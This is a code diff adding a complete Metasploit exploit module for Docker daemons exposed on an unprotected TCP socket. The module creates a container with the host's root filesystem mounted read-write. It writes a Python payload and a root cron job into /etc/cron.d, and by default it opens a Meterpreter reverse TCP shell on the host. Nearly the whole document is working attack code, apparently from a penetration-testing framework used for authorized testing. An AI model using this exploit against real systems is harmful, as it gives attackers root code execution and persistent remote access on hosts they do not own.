@@ -1,0 +1,207 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'             => 'Docker Daemon - Unprotected TCP Socket Exploit',
+      'Description'      => %q{
+        Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp
+        with tls but without tls-auth), an attacker can create a Docker
+        container with the '/' path mounted with read/write permissions on the
+        host server that is running the Docker container. As the Docker
+        container executes command as uid 0 it is honored by the host operating
+        system allowing the attacker to edit/create files owned by root. This
+        exploit abuses this to creates a cron job in the '/etc/cron.d/' path of
+        the host server.
+
+        The Docker image should exist on the target system or be a valid image
+        from hub.docker.com.
+      },
+      'Author'           => 'Martin Pizala', # started with dcos_marathon module from Erik Daguerre
+      'License'          => MSF_LICENSE,
+      'References'       => [
+        ['URL', 'https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface'],
+        ['URL', 'https://docs.docker.com/engine/reference/commandline/dockerd/#bind-docker-to-another-hostport-or-a-unix-socket']
+      ],
+      'DisclosureDate'   => 'Jul 25, 2017',
+      'Targets'          => [
+        [ 'Python', {
+          'Platform'     => 'python',
+          'Arch'         => ARCH_PYTHON,
+          'Payload'      => {
+            'Compat'     => {
+              'ConnectionType' => 'reverse noconn none tunnel'
+            }
+          }
+        }]
+      ],
+      'DefaultOptions'   => { 'WfsDelay' => 180, 'Payload' => 'python/meterpreter/reverse_tcp' },
+      'DefaultTarget'    => 0))
+
+    register_options(
+      [
+        Opt::RPORT(2375),
+        OptString.new('DOCKERIMAGE', [ true, 'hub.docker.com image to use', 'python:3-slim' ]),
+        OptString.new('CONTAINER_ID', [ false, 'container id you would like'])
+      ]
+    )
+  end
+
+  def check_image(image_id)
+    vprint_status("Check if images exist on the target host")
+    res = send_request_raw(
+      'method'  => 'GET',
+      'uri'     => normalize_uri('images', 'json')
+    )
+    return unless res and res.code == 200 and res.body.include? image_id
+
+    res
+  end
+
+  def pull_image(image_id)
+    print_status("Trying to pulling image from docker registry, this may take a while")
+    res = send_request_raw(
+      'method'  => 'POST',
+      'uri'     => normalize_uri('images', 'create?fromImage=' + image_id)
+    )
+    return unless res.code == 200
+
+    res
+  end
+
+  def make_container_id
+    return datastore['CONTAINER_ID'] unless datastore['CONTAINER_ID'].nil?
+
+    rand_text_alpha_lower(8)
+  end
+
+  def make_cmd(mnt_path, cron_path, payload_path)
+    vprint_status('Creating the docker container command')
+    echo_cron_path = mnt_path + cron_path
+    echo_payload_path = mnt_path + payload_path
+
+    cron_command = "python #{payload_path}"
+    payload_data = payload.raw
+
+    command = "echo \"#{payload_data}\" >> #{echo_payload_path} && "
+    command << "echo \"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\" >> #{echo_cron_path} && "
+    command << "echo \"\" >> #{echo_cron_path} && "
+    command << "echo \"* * * * * root #{cron_command}\" >> #{echo_cron_path}"
+
+    command
+  end
+
+  def make_container(mnt_path, cron_path, payload_path)
+    vprint_status('Setting container json request variables')
+    {
+      'Image'       => datastore['DOCKERIMAGE'],
+      'Cmd'         => make_cmd(mnt_path, cron_path, payload_path),
+      'Entrypoint'  => %w[/bin/sh -c],
+      'HostConfig' => {
+        'Binds'    => [
+          '/:' + mnt_path
+        ]
+      }
+    }
+  end
+
+  def del_container(container_id)
+    send_request_raw(
+      {
+        'method'  => 'DELETE',
+        'uri'     => normalize_uri('containers', container_id)
+      },
+      1 # timeout
+    )
+  end
+
+  def check
+    res = send_request_raw(
+      'method'   => 'GET',
+      'uri'      => normalize_uri('containers', 'json'),
+      'headers'  => { 'Accept' => 'application/json' }
+    )
+
+    if res.nil?
+      print_error('Failed to connect to the target')
+      return Exploit::CheckCode::Unknown
+    end
+
+    if res and res.code == 200 and res.headers['Server'].include? 'Docker'
+      return Exploit::CheckCode::Vulnerable
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    # check if target is vulnerable
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Failure::Unknown, 'Failed to connect to the target')
+    end
+
+    # check if image is not available, pull it or fail out
+    image_id = datastore['DOCKERIMAGE']
+    if check_image(image_id).nil?
+      fail_with(Failure::Unknown, 'Failed to pull the docker image') if pull_image(image_id).nil?
+    end
+
+    # create required information to create json container information.
+    cron_path = '/etc/cron.d/' + rand_text_alpha(8)
+    payload_path = '/tmp/' + rand_text_alpha(8)
+    mnt_path = '/mnt/' + rand_text_alpha(8)
+    container_id = make_container_id
+
+    # create container
+    res_create = send_request_raw(
+      'method'  => 'POST',
+      'uri'     => normalize_uri('containers', 'create?name=' + container_id),
+      'headers' => { 'Content-Type' => 'application/json' },
+      'data'    => make_container(mnt_path, cron_path, payload_path).to_json
+    )
+    fail_with(Failure::Unknown, 'Failed to create the docker container') unless res_create && res_create.code == 201
+
+    print_status("The docker container is created, waiting for deploy")
+    register_files_for_cleanup(cron_path, payload_path)
+
+    # start container
+    send_request_raw(
+      {
+        'method'  => 'POST',
+        'uri'     => normalize_uri('containers', container_id, 'start')
+      },
+      1 # timeout
+    )
+
+    # wait until container stopped
+    vprint_status("Waiting until the docker container stopped")
+    res_wait = send_request_raw(
+      'method'  => 'POST',
+      'uri'     => normalize_uri('containers', container_id, 'wait'),
+      'headers' => { 'Accept' => 'application/json' }
+    )
+
+    # delete container
+    deleted_container = false
+    if res_wait.code == 200
+      vprint_status("The docker container has been stopped, now trying to remove it")
+      del_container(container_id)
+      deleted_container = true
+    end
+
+    # if container does not deploy, remove it and fail out
+    unless deleted_container
+      del_container(container_id)
+      fail_with(Failure::Unknown, "The docker container failed to deploy")
+    end
+    print_status('Waiting for the cron job to run, can take up to 60 seconds')
+  end
+end
